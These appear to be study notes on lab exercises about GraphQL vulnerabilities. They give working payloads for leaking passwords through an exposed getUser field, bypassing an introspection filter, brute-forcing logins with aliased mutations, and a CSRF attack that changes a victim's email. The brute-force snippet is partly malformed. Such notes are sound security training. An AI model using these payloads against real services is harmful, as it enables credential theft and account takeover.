## GraphQL Vulnerabilities
- ==Accidental exposure of private GraphQL fields==
  Use Introspection query to see what field can be queried, then modify a getBlogPost operation with the correct fields to get the administrator password and log in and delete cartlos
  
  {"query":"\n    query getUser($id: Int!) {\n        getUser(id: $id) {\n            username\n            password\n            }\n    }","operationName":"getUser","variables":{"id":1}}
- ==Finding a hidden GraphQL endpoint==
  Explore the Sitemap and find that there is a GET /api endpoint. 
  Try query this using GET /api?query=query+%7b%0a__schema+%0a%7b++++++++queryType+%7b%0a++++++++++++name%0a++++++++%7d%0a++++++++mutationType+%7b%0a++++++++++++name%0a++++++++%7d%0a++++++++subscriptionType+%7b%0a++++++++++++name%0a++++++++%7d%0a++++++++types+%7b%0a++++++++++++...FullType%0a++++++++%7d%0a++++++++directives+%7b%0a++++++++++++name%0a++++++++++++description%0a++++++++++++locations%0a++++++++++++args+%7b%0a++++++++++++++++...InputValue%0a++++++++++++%7d%0a++++++++%7d%0a++++%7d%0a%7d%0a%0afragment+FullType+on+__Type+%7b%0a++++kind%0a++++name%0a++++description%0a++++fields%28includeDeprecated%3a+true%29+%7b%0a++++++++name%0a++++++++description%0a++++++++args+%7b%0a++++++++++++...InputValue%0a++++++++%7d%0a++++++++type+%7b%0a++++++++++++...TypeRef%0a++++++++%7d%0a++++++++isDeprecated%0a++++++++deprecationReason%0a++++%7d%0a++++inputFields+%7b%0a++++++++...InputValue%0a++++%7d%0a++++interfaces+%7b%0a++++++++...TypeRef%0a++++%7d%0a++++enumValues%28includeDeprecated%3a+true%29+%7b%0a++++++++name%0a++++++++description%0a++++++++isDeprecated%0a++++++++deprecationReason%0a++++%7d%0a++++possibleTypes+%7b%0a++++++++...TypeRef%0a++++%7d%0a%7d%0a%0afragment+InputValue+on+__InputValue+%7b%0a++++name%0a++++description%0a++++type+%7b%0a++++++++...TypeRef%0a++++%7d%0a++++defaultValue%0a%7d%0a%0afragment+TypeRef+on+__Type+%7b%0a++++kind%0a++++name%0a++++ofType+%7b%0a++++++++kind%0a++++++++name%0a++++++++ofType+%7b%0a++++++++++++kind%0a++++++++++++name%0a++++++++++++ofType+%7b%0a++++++++++++++++kind%0a++++++++++++++++name%0a++++++++++++%7d%0a++++++++%7d%0a++++%7d%0a%7d
  
  Which bypasses the introspection query.
  Save the result: Right-click -> GraphQL -> Save GraphQL queries to sitemap. Test out the APIs, there is a getUser API, which can be used to find that carlos has the user id 3. Use the other API which is DeleteOrganizationUserInput to delete carlos
- ==Bypassing GraphQL brute force protections==
   Try login with invalid credentials and send to Repeater.
   In the GraphQL tab, use this payload with generated code:
   
   copy(`password_list`.split(',').map((element,index)=>`
   bruteforce
```
   $index:login(input:{password: "$password", username: "carlos"}) {
           token
        success
            }
            `.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log
            "The query has been copied to your clipboard.");

  mutation login{
          generated code
    }
```
  
  Find true in the response, then find the attempt that generated the true code

- ==Performing CSRF exploits over GraphQL==
  Send the Update email feature and send this request to the Repeater. Change the email to a different address and send to test that it can still work, meaning the session cookie is reused. Change request method twice to change the header so that it is Content-Type: x-www-form-urlencoded
  
  Add the query back in     query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
  
  and generate a CSRF PoC payload and use the exploit server to deliver it.
